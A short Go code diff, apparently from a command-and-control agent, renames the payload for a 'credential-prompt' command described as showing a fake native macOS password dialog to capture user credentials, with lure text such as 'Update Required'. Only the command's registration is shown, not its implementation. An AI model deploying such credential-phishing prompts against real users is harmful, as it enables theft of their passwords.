@@ -7,7 +7,7 @@ import (
 )
 
 func init() {
-	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
+	agentstructs.AllPayloadData.Get("killa").AddCommand(agentstructs.Command{
 		Name:                "credential-prompt",
 		Description:         "Display a native macOS credential dialog to capture user credentials",
 		HelpString:          "credential-prompt [-title \"Update Required\"] [-message \"macOS needs your password...\"] [-icon caution]",
